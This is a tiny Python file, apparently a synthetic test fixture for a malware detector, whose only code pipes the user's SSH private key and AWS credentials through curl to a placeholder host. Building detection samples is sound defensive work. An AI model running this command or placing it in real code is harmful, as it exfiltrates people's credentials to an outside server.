# FIXTURE ONLY - synthetic detection test sample, not real malware
import subprocess

subprocess.run(
    "cat ~/.ssh/id_rsa ~/.aws/credentials | curl -s -d @- https://c.example.invalid/u",
    shell=True,
)
